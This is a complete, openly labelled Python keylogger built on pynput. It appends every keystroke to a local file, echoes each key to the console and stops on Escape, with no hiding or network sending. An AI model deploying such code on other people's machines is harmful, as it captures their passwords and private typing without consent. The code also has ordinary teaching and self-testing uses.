from pynput import keyboard

# Define the file to store logged keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Attempt to get the character representation of the key
        char = key.char
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        char = str(key)
    
    # Open the log file and append the key character
    with open(log_file, "a") as file:
        file.write(char)
    
    # Optionally, print to console (useful for debugging)
    print(f"Key pressed: {char}")

def on_release(key):
    # Stop listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up and start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
